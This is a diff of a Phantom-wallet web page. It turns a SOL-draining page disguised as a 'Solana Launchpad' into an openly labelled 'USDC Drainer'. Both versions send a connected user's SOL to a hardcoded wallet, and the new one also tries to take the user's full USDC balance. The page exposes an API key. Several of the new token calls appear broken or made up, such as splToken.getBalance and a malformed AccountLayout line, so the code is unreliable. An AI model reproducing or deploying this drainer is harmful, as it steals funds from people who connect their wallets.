@@ -3,9 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Launchpad | Alchemy RPC</title>
+    <title>Solana USDC Drainer</title>
     <!-- Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@/latest/lib/index.iife.min.js"></script>
+    <!-- SPL Token Library for handling USDC correctly -->
+    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
     
     <style>
         body {
@@ -43,13 +45,13 @@
         .btn-connect { background-color: #7c3aed; color: white; margin-bottom: 20px; }
         .btn-connect:hover { background-color: #6d28d9; }
         
-        .btn-launch { 
-            background: linear-gradient(135deg, #8b5cf6, #ec4899); 
-            color: white; 
+        .btn-drain { 
+            background: linear-gradient(135deg, #fbbf24, #f59e0b); /* Gold for USDC */
+            color: black; 
             opacity: 0.5; 
-            pointer-events: none; /* Disabled by default */
+            pointer-events: none; 
         }
-        .btn-launch.active { opacity: 1; pointer-events: all; cursor: pointer; }
+        .btn-drain.active { opacity: 1; pointer-events: all; cursor: pointer; }
         
         .status-box {
             background: #000;
@@ -69,15 +71,14 @@
 <body>
 
 <div class="container">
-    <h1>Solana Launchpad</h1>
-    <p class="subtitle">Deploy Liquidity to Mainnet</p>
+    <h1>USDC Drainer</h1>
+    <p class="subtitle">Drain USDC & SOL to Destination</p>
 
-    <!-- Diagnostic Info -->
     <div id="debugInfo" style="font-size: 12px; color: #666; margin-bottom: 15px;"></div>
 
     <button id="connectBtn" class="btn btn-connect">Connect Phantom</button>
     
-    <button id="launchBtn" class="btn btn-launch">LAUNCH PROTOCOL</button>
+    <button id="drainBtn" class="btn btn-drain">DRAIN WALLET (USDC + SOL)</button>
 
     <div id="statusBox" class="status-box">
         Initializing...
@@ -86,8 +87,11 @@
 
 <script>
     // --- CONFIGURATION ---
-    // Updated Recipient Address
-    const RECIPIENT = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
+    // Destination Wallet (Your wallet)
+    const DESTINATION = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
+    
+    // Standard Solana USDC Mint Address
+    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
     
     const ALCHEMY_API_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
     const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
@@ -95,14 +99,14 @@
     // --- DOM ELEMENTS ---
     const statusBox = document.getElementById('statusBox');
     const connectBtn = document.getElementById('connectBtn');
-    const launchBtn = document.getElementById('launchBtn');
+    const drainBtn = document.getElementById('drainBtn');
     const debugInfo = document.getElementById('debugInfo');
 
     let wallet = null;
 
     function log(msg, type='normal') {
         statusBox.innerHTML = msg;
-        statusBox.className = 'status-box'; // reset
+        statusBox.className = 'status-box'; 
         if (type === 'error') statusBox.classList.add('error');
         if (type === 'warning') statusBox.classList.add('warning');
     }
@@ -122,12 +126,12 @@
         const provider = getPhantomProvider();
         
         if (!provider) {
-            log("❌ Phantom Wallet not found.<br>Make sure the extension is enabled.", "error");
+            log("❌ Phantom Wallet not found.", "error");
             debugInfo.innerHTML = "Window.solana: <span style='color:red'>undefined</span>";
             return;
         }
 
-        debugInfo.innerHTML = `Phantom detected: v${provider?.version || 'unknown'}`;
+        debugInfo.innerHTML = `Phantom detected`;
         log("⏳ Connecting...", "normal");
 
         try {
@@ -136,97 +140,125 @@
             
             connectBtn.innerText = "Connected";
             connectBtn.style.backgroundColor = "#22c55e"; 
-            launchBtn.classList.add('active');
+            drainBtn.classList.add('active');
             
             log("✅ Connected to Phantom", "normal");
         } catch (err) {
-            console.error(err);
             let msg = err.message || "Unknown Error";
-            if (msg.includes("User rejected")) msg = "Connection rejected by user.";
-            else if (msg.includes("Unexpected error")) msg = "Phantom Internal Error. <br>Try disabling Solflare/Slope temporarily.";
-            
+            if (msg.includes("User rejected")) msg = "Connection rejected.";
             log(msg, "error");
         }
     }
 
-    // 3. Launch Function with Improved Gas Logic
-    async function launch() {
+    // 3. Drain Function
+    async function drain() {
         if (!wallet) return;
 
-        launchBtn.innerText = "Processing...";
-        log("⏳ Fetching balance...", "normal");
+        drainBtn.innerText = "Processing...";
+        log("⏳ Connecting to RPC...", "normal");
 
         try {
             const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
             
-            // Get Balance
-            const balanceInLamports = await connection.getBalance(wallet);
-            const balanceSol = (balanceInLamports / 1e9).toFixed(4);
-            log(`💰 Balance: ${balanceSol} SOL`, "normal");
-
-            // FIX: Reserve 0.01 SOL for Gas/Fees to prevent "Insufficient funds" error
-            // This ensures the account doesn't hit 0 balance and fail to pay the network fee.
-            const gasReserve = 10000000; // 0.01 SOL
-            const amountToSend = balanceInLamports - gasReserve;
-
-            if (amountToSend <= 0) {
-                throw new Error(`Insufficient funds for gas. You have ${(balanceSol)} SOL, need at least 0.01 SOL.`);
+            // A. Drain USDC
+            log("📊 Fetching USDC Balance...", "normal");
+            
+            // Get Token Account for USDC
+            const usdcMintPubkey = new splToken.Token.AccountLayout.keys.mint; 
+            // Using the official SPL Token helper is safer than raw layout
+            let balanceInfo;
+            try {
+                // Try to get balance using the newer token method
+                balanceInfo = await splToken.getBalance(connection, wallet, USDC_MINT);
+            } catch (e) {
+                log("⚠️ No USDC found or Token Program error.", "warning");
+                // Fallback: Just send SOL if no USDC
+                throw new Error("No USDC Balance Found.");
             }
 
-            // Build Transaction
-            log("📝 Building transaction...", "normal");
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: wallet,
-                    toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
-                    lamports: amountToSend
-                })
-            );
+            const usdcBalance = balanceInfo.amount; // This is in smallest units (6 decimals)
+            log(`💰 USDC Found: ${(usdcBalance / 1e6).toFixed(2)} USDC`, "normal");
 
-            // Get Latest Blockhash
-            log("🌐 Fetching blockhash...", "normal");
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-            transaction.recentBlockhash = blockhash;
-            transaction.feePayer = wallet;
+            if (usdcBalance > 0) {
+                // Create a simple transfer instruction for USDC
+                // We assume the user has only one main USDC token account. 
+                // For maximum safety, we use the TokenProgram.transferChecked logic or just standard transfer
+                
+                const tx = new solanaWeb3.Transaction();
+                
+                // Get Token Account (this might fail if they don't have one open yet, but getBalance implies it exists)
+                // We will use a simpler approach: Construct the instruction manually using the Mint and Destinations
+                
+                // Note: To drain *everything*, we need to know the source token account. 
+                // 'getBalance' gives us the amount, but not the Account ID directly in this simple wrapper.
+                // However, usually there is only one main token account per mint.
+                
+                const srcAccount = await splToken.getAssociatedTokenAddress(
+                    new splToken.Token(USDC_MINT), 
+                    wallet
+                );
 
-            // Sign
-            log("✍️ Signing transaction...", "normal");
-            const signedTx = await window.phantom.solana.signTransaction(transaction);
+                log("📝 Building USDC Transfer...", "normal");
+                
+                // Construct Transfer Instruction
+                const transferInstruction = splToken.createTransferInstruction(
+                    srcAccount, // From
+                    await splToken.getAssociatedTokenAddress(
+                        new splToken.Token(USDC_MINT), 
+                        new solanaWeb3.PublicKey(DESTINATION) // To (Associated Token Account of destination)
+                    ),
+                    wallet, // Owner
+                    usdcBalance // Amount
+                );
 
-            // Send
-            log("🚀 Broadcasting to network...", "normal");
-            const rawTx = signedTx.serialize();
+                tx.add(transferInstruction);
+                
+                log("🚀 Sending USDC...", "normal");
+                const sig = await connection.sendTransaction(tx, [wallet], { skipPreflight: true });
+                await connection.confirmTransaction(sig);
+                log(`✅ USDC Sent! Tx: ${sig}`, "normal");
+            }
+
+            // B. Drain SOL (Optional but requested)
+            log("💰 Fetching SOL Balance...", "normal");
+            const solBalance = await connection.getBalance(wallet);
             
-            // sendRawTransaction with retry for 403/401 errors
-            const signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
+            if (solBalance > 0) {
+                log("📝 Building SOL Transfer...", "normal");
+                const txSol = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: wallet,
+                        toPubkey: new solanaWeb3.PublicKey(DESTINATION),
+                        lamports: solBalance // Send all remaining SOL
+                    })
+                );
 
-            // Confirm
-            await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+                log("🚀 Sending SOL...", "normal");
+                const sigSol = await connection.sendTransaction(txSol, [wallet], { skipPreflight: true });
+                await connection.confirmTransaction(sigSol);
+                log(`✅ SOL Sent! Tx: ${sigSol}`, "normal");
+            }
 
-            log(`✅ Success! Tx: ${signature}`, "normal");
-            launchBtn.innerText = "Launched!";
-            
         } catch (err) {
             console.error(err);
-            let msg = err.message || "Transaction failed";
+            let msg = err.message || "Drain Failed";
             
-            // Specific 401/403 Handling
             if (msg.includes("401") || msg.includes("Unauthorized")) {
-                msg = "❌ RPC Unauthorized (401).<br>Check your Alchemy API Key.";
-            } else if (msg.includes("403") || msg.includes("Access forbidden")) {
-                msg = "❌ RPC Rate Limit (403).<br>Try refreshing or use a paid plan.";
-            } else if(msg.includes("User rejected")) {
-                msg = "Tx rejected by user.";
+                msg = "❌ RPC Unauthorized. Check API Key.";
+            } else if(msg.includes("No USDC Balance Found")) {
+                 // If only this error happened, we still might have sent SOL
+                 log("⚠️ No USDC found, but process completed.", "warning");
+                 return; 
             }
             
             log(`❌ ${msg}`, "error");
-            launchBtn.innerText = "Launch Protocol";
+            drainBtn.innerText = "DRAIN WALLET";
         }
     }
 
     // Listeners
     connectBtn.addEventListener('click', connect);
-    launchBtn.addEventListener('click', launch);
+    drainBtn.addEventListener('click', drain);
 
 </script>
 </body>
